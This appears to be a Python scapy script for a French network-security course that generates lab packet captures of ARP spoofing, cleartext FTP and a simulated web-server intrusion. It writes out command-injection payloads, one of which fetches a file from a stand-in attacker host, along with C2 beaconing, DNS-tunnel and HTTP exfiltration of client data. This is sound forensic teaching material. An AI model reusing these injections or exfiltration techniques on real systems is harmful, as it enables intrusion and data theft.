#!/usr/bin/env python3
"""Génère les captures pédagogiques du lab 3-020 (adresses du lab, trafic simulé et inerte).

  tp1-arp-demo.pcap   usurpation ARP sur le WAN (ext -> cloud-gw)         [repli du TP 1]
  tp1-ftp-clear.pcap  authentification FTP en clair Kali -> web           [repli du TP 1]
  tp7-incident.pcap   scénario d'intrusion vu par la sonde DMZ d'une autre PME [TP 7]

Usage : python3 generer_captures.py [répertoire]   (nécessite python3-scapy)
"""
import random, sys, os
from datetime import datetime, timezone
from scapy.all import Ether, ARP, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, wrpcap

random.seed(3020)
OUT = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else os.path.dirname(os.path.abspath(__file__))

# Adresses et MAC du lab (identiques aux scripts d'installation)
MAC = {
    "fw-lan": "52:54:00:30:20:02", "fw-dmz": "52:54:00:30:20:04",
    "poste": "52:54:00:aa:10:10", "client": "00:16:3e:30:20:20",
    "intrus": "00:16:3e:30:20:66", "web": "00:16:3e:30:20:30",
    # environnement Hexceos (cartes Proxmox bc:24:11)
    "kali-lan": "bc:24:11:4c:10:10", "fw-lan-hx": "bc:24:11:36:d5:ec", "fw-wan": "bc:24:11:cf:ce:66",
    "cloud-gw": "bc:24:11:7a:00:30", "ext": "bc:24:11:7a:00:40",
}
BCAST = "ff:ff:ff:ff:ff:ff"


def ts(s):
    return datetime.strptime(s, "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc).timestamp()


class Flux:
    """Petite session TCP cohérente (poignée de main, données, fermeture)."""

    def __init__(self, pkts, cmac, smac, cip, sip, sport, dport, t):
        self.p, self.cm, self.sm, self.ci, self.si = pkts, cmac, smac, cip, sip
        self.sp, self.dp, self.t = sport, dport, t
        self.cs, self.ss = random.randint(10**8, 4 * 10**9), random.randint(10**8, 4 * 10**9)

    def _add(self, cli, flags, data=b"", dt=0.0004):
        self.t += dt
        if cli:
            pk = Ether(src=self.cm, dst=self.sm) / IP(src=self.ci, dst=self.si, ttl=64) / \
                TCP(sport=self.sp, dport=self.dp, flags=flags, seq=self.cs, ack=self.ss if "A" in flags else 0, window=64240)
        else:
            pk = Ether(src=self.sm, dst=self.cm) / IP(src=self.si, dst=self.ci, ttl=63) / \
                TCP(sport=self.dp, dport=self.sp, flags=flags, seq=self.ss, ack=self.cs, window=65160)
        if data:
            pk = pk / Raw(load=data)
        pk.time = self.t
        self.p.append(pk)
        n = len(data) + (1 if ("S" in flags or "F" in flags) else 0)
        if cli:
            self.cs += n
        else:
            self.ss += n

    def ouvrir(self):
        self._add(True, "S", dt=0)
        self._add(False, "SA", dt=0.0006)
        self._add(True, "A")
        return self

    def envoi(self, cli, data, dt=0.002):
        data = data.encode() if isinstance(data, str) else data
        first = True
        for i in range(0, len(data), 1400):
            self._add(cli, "PA", data[i:i + 1400], dt=dt if first else 0.0003)
            first = False
        self._add(not cli, "A")
        return self

    def fermer(self):
        self._add(True, "FA", dt=0.001)
        self._add(False, "FA")
        self._add(True, "A")
        return self


# --------------------------------------------------------------------------
def tp1_arp():
    p, t = [], ts("2026-11-23 09:41:00")
    # victime cloud-gw, usurpateur ext, « passerelle » usurpée = WAN de pfSense
    C, I, G = ("10.10.0.30", MAC["cloud-gw"]), ("10.10.0.40", MAC["ext"]), ("10.10.0.20", MAC["fw-wan"])

    def add(pk, dt):
        nonlocal t
        t += dt
        pk.time = t
        p.append(pk)

    add(Ether(src=C[1], dst=BCAST) / ARP(op=1, hwsrc=C[1], psrc=C[0], pdst=G[0]), 0)
    add(Ether(src=G[1], dst=C[1]) / ARP(op=2, hwsrc=G[1], psrc=G[0], hwdst=C[1], pdst=C[0]), 0.0004)
    seq = 1
    for _ in range(4):  # trafic normal : le client pingue la passerelle
        add(Ether(src=C[1], dst=G[1]) / IP(src=C[0], dst=G[0]) / ICMP(type=8, id=0x3020, seq=seq), 1.0)
        add(Ether(src=G[1], dst=C[1]) / IP(src=G[0], dst=C[0]) / ICMP(type=0, id=0x3020, seq=seq), 0.0005)
        seq += 1
    for k in range(8):  # réponses ARP non sollicitées : « 10.1.10.1 est à la MAC de l'intrus »
        add(Ether(src=I[1], dst=C[1]) / ARP(op=2, hwsrc=I[1], psrc=G[0], hwdst=C[1], pdst=C[0]), 0.35 if k else 0.6)
        # le client envoie désormais ses pings à l'intrus, qui les relaie vers la vraie passerelle
        add(Ether(src=C[1], dst=I[1]) / IP(src=C[0], dst=G[0]) / ICMP(type=8, id=0x3020, seq=seq), 0.3)
        add(Ether(src=I[1], dst=G[1]) / IP(src=C[0], dst=G[0], ttl=63) / ICMP(type=8, id=0x3020, seq=seq), 0.0003)
        add(Ether(src=G[1], dst=C[1]) / IP(src=G[0], dst=C[0]) / ICMP(type=0, id=0x3020, seq=seq), 0.0005)
        seq += 1
        add(Ether(src=I[1], dst=C[1]) / ARP(op=2, hwsrc=I[1], psrc=G[0], hwdst=C[1], pdst=C[0]), 1.35)
    # fin de la démonstration : la passerelle se réannonce, le cache du client est corrigé
    add(Ether(src=G[1], dst=BCAST) / ARP(op=2, hwsrc=G[1], psrc=G[0], hwdst=BCAST, pdst=G[0]), 2.0)
    for _ in range(2):
        add(Ether(src=C[1], dst=G[1]) / IP(src=C[0], dst=G[0]) / ICMP(type=8, id=0x3020, seq=seq), 1.0)
        add(Ether(src=G[1], dst=C[1]) / IP(src=G[0], dst=C[0]) / ICMP(type=0, id=0x3020, seq=seq), 0.0005)
        seq += 1
    wrpcap(os.path.join(OUT, "tp1-arp-demo.pcap"), p)


def tp1_ftp():
    p = []
    f = Flux(p, MAC["kali-lan"], MAC["fw-lan-hx"], "10.1.10.10", "10.1.30.10", 51544, 21, ts("2026-11-23 09:52:10")).ouvrir()
    for cli, msg in [
        (False, "220 (vsFTPd 3.0.5)\r\n"), (True, "USER ftpdemo\r\n"), (False, "331 Please specify the password.\r\n"),
        (True, "PASS ftpdemo123\r\n"), (False, "230 Login successful.\r\n"), (True, "SYST\r\n"),
        (False, "215 UNIX Type: L8\r\n"), (True, "PWD\r\n"), (False, '257 "/" is the current directory\r\n'),
        (True, "QUIT\r\n"), (False, "221 Goodbye.\r\n")]:
        f.envoi(cli, msg, dt=random.uniform(0.05, 1.8) if cli else 0.003)
    f.fermer()
    wrpcap(os.path.join(OUT, "tp1-ftp-clear.pcap"), p)


# --------------------------------------------------------------------------
def tp7_incident():
    """Sonde DMZ (port miroir de web). À l'époque, web était publié en NAT 1:1 (tous ports)."""
    p = []
    WEB, GW = ("10.1.30.10", MAC["web"]), MAC["fw-dmz"]
    ATT, C2, NS = "198.51.100.66", "198.51.100.77", "198.51.100.53"
    UA_SCAN = "Mozilla/5.0 (compatible; Nikto/2.5.0)"
    UA = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    sport = iter(range(40000, 65000))

    def entrant(t):  # session attaquant -> web
        return Flux(p, GW, WEB[1], ATT, WEB[0], next(sport), 80, t)

    # 1. Reconnaissance : balayage SYN (03:12)
    t = ts("2026-11-12 03:12:04")
    ports = sorted(set(random.sample(range(1, 10000), 230) + [21, 22, 23, 80, 161, 443, 3000, 3306]))
    ouverts = {21, 22, 23, 80, 443, 3000}
    for port in ports:
        t += random.uniform(0.002, 0.012)
        sp = random.randint(33000, 60000)
        s = Ether(src=GW, dst=WEB[1]) / IP(src=ATT, dst=WEB[0], ttl=52) / TCP(sport=sp, dport=port, flags="S", seq=1000, window=1024)
        s.time = t; p.append(s)
        if port in ouverts:
            r = Ether(src=WEB[1], dst=GW) / IP(src=WEB[0], dst=ATT) / TCP(sport=port, dport=sp, flags="SA", seq=5000, ack=1001)
            r.time = t + 0.0004; p.append(r)
            k = Ether(src=GW, dst=WEB[1]) / IP(src=ATT, dst=WEB[0], ttl=52) / TCP(sport=sp, dport=port, flags="R", seq=1001)
            k.time = t + 0.03; p.append(k)
        else:
            r = Ether(src=WEB[1], dst=GW) / IP(src=WEB[0], dst=ATT) / TCP(sport=port, dport=sp, flags="RA", seq=0, ack=1001)
            r.time = t + 0.0004; p.append(r)

    # 2. Reconnaissance web puis accès au dépôt git oublié (03:14)
    t = ts("2026-11-12 03:14:31")
    git_cfg = ("[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n"
               "\turl = https://deploy:Deploy2019!@git.lab.local/intranet.git\n")
    for uri, code, corps in [("/", "200 OK", "<h1>Intranet PME</h1>"), ("/robots.txt", "404 Not Found", ""),
                             ("/admin/", "404 Not Found", ""), ("/backup.zip", "404 Not Found", ""),
                             ("/phpmyadmin/", "404 Not Found", ""), ("/.env", "404 Not Found", ""),
                             ("/.git/HEAD", "200 OK", "ref: refs/heads/main\n"), ("/.git/config", "200 OK", git_cfg),
                             ("/dvwa/", "302 Found", "")]:
        t += random.uniform(0.15, 0.6)
        f = entrant(t).ouvrir()
        f.envoi(True, f"GET {uri} HTTP/1.1\r\nHost: 203.0.113.12\r\nUser-Agent: {UA_SCAN}\r\nAccept: */*\r\n\r\n")
        f.envoi(False, f"HTTP/1.1 {code}\r\nServer: nginx/1.24.0 (Ubuntu)\r\nContent-Type: text/html\r\n"
                       f"Content-Length: {len(corps)}\r\n\r\n{corps}")
        f.fermer(); t = f.t

    # 3. Accès initial : identifiants par défaut puis injection de commande (03:17-03:18)
    t = ts("2026-11-12 03:17:12")
    f = entrant(t).ouvrir()
    body = "username=admin&password=password&Login=Login&user_token=5f1c0e7d"
    f.envoi(True, f"POST /dvwa/login.php HTTP/1.1\r\nHost: 203.0.113.12\r\nUser-Agent: {UA}\r\n"
                  f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\n\r\n{body}")
    f.envoi(False, "HTTP/1.1 302 Found\r\nServer: nginx/1.24.0 (Ubuntu)\r\nSet-Cookie: PHPSESSID=8d1f2c; path=/\r\n"
                   "Location: index.php\r\nContent-Length: 0\r\n\r\n")
    f.fermer()
    for cmd, sortie in [("127.0.0.1%3Bid", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"),
                        ("127.0.0.1%3Bcat+%2Fetc%2Fhostname", "web"),
                        ("127.0.0.1%3Bcurl+-s+http%3A%2F%2F198.51.100.77%3A8080%2Fa+-o+%2Ftmp%2F.a", "")]:
        t = f.t + random.uniform(20, 35)
        f = entrant(t).ouvrir()
        body = f"ip={cmd}&Submit=Submit"
        f.envoi(True, f"POST /dvwa/vulnerabilities/exec/ HTTP/1.1\r\nHost: 203.0.113.12\r\nUser-Agent: {UA}\r\n"
                      f"Cookie: PHPSESSID=8d1f2c; security=low\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                      f"Content-Length: {len(body)}\r\n\r\n{body}")
        html = f"<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n...\n{sortie}</pre>"
        f.envoi(False, f"HTTP/1.1 200 OK\r\nServer: nginx/1.24.0 (Ubuntu)\r\nContent-Type: text/html\r\n"
                       f"Content-Length: {len(html)}\r\n\r\n{html}")
        f.fermer()

    # web télécharge l'« agent » (contenu inerte de démonstration)
    t = f.t + 0.4
    g = Flux(p, WEB[1], GW, WEB[0], C2, next(sport), 8080, t).ouvrir()
    g.envoi(True, "GET /a HTTP/1.1\r\nHost: 198.51.100.77:8080\r\nUser-Agent: curl/8.5.0\r\nAccept: */*\r\n\r\n")
    agent = "#!/bin/sh\n# agent de demonstration - inerte\nwhile true; do sleep 30; done\n"
    g.envoi(False, f"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {len(agent)}\r\n\r\n{agent}")
    g.fermer()

    # 4. Commande et contrôle : balise HTTP toutes les ~30 s (03:19-03:31)
    t = ts("2026-11-12 03:19:02")
    balises = []
    while t < ts("2026-11-12 03:31:00"):
        balises.append(t); t += 30 + random.uniform(-0.6, 0.6)
    # 6. Exfiltration à 03:27:40 ; 5. Tunnel DNS 03:24-03:25
    evts = [("b", x) for x in balises] + [("x", ts("2026-11-12 03:27:40"))] + \
           [("d", ts("2026-11-12 03:24:10") + i * random.uniform(1.5, 3.0)) for i in range(18)]
    evts.sort(key=lambda e: e[1])
    lignes = ["client;email;montant"] + [f"Client{i:04d};client{i:04d}@exemple.fr;{random.randint(80, 9000)}" for i in range(600)]
    csv = "\n".join(lignes) + "\n"
    import base64
    morceaux = base64.b32encode(csv[:900].encode()).decode().rstrip("=").lower()
    di = 0
    for kind, tt in evts:
        if kind == "b":
            g = Flux(p, WEB[1], GW, WEB[0], C2, next(sport), 8080, tt).ouvrir()
            g.envoi(True, f"GET /b?id=web-dmz&s={int(tt) % 100000} HTTP/1.1\r\nHost: 198.51.100.77:8080\r\n"
                          "User-Agent: curl/8.5.0\r\nAccept: */*\r\n\r\n")
            g.envoi(False, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 5\r\n\r\nsleep")
            g.fermer()
        elif kind == "d":
            chunk = morceaux[di * 50:(di + 1) * 50] or "fin"
            q = f"{chunk}.{di}.t.update-check.example"
            qid = random.randint(1, 65535); sp = random.randint(30000, 60000)
            a = Ether(src=WEB[1], dst=GW) / IP(src=WEB[0], dst=NS) / UDP(sport=sp, dport=53) / \
                DNS(id=qid, rd=1, qd=DNSQR(qname=q, qtype="TXT"))
            a.time = tt; p.append(a)
            r = Ether(src=GW, dst=WEB[1]) / IP(src=NS, dst=WEB[0], ttl=50) / UDP(sport=53, dport=sp) / \
                DNS(id=qid, qr=1, aa=1, rd=1, qd=DNSQR(qname=q, qtype="TXT"),
                    an=DNSRR(rrname=q, type="TXT", ttl=0, rdata="ok"))
            r.time = tt + 0.041; p.append(r)
            di += 1
        else:
            g = Flux(p, WEB[1], GW, WEB[0], C2, next(sport), 8080, tt).ouvrir()
            g.envoi(True, f"POST /u HTTP/1.1\r\nHost: 198.51.100.77:8080\r\nUser-Agent: curl/8.5.0\r\n"
                          f"Content-Type: text/csv\r\nContent-Disposition: attachment; filename=\"export-clients.csv\"\r\n"
                          f"Content-Length: {len(csv)}\r\n\r\n{csv}")
            g.envoi(False, "HTTP/1.1 201 Created\r\nContent-Length: 2\r\n\r\nok")
            g.fermer()

    p.sort(key=lambda x: x.time)
    wrpcap(os.path.join(OUT, "tp7-incident.pcap"), p)


if __name__ == "__main__":
    tp1_arp(); tp1_ftp()
    if "--tp7" in sys.argv:  # la capture du TP 7 est celle d'une autre PME : inchangée par défaut
        tp7_incident()
    print("captures écrites dans", OUT)
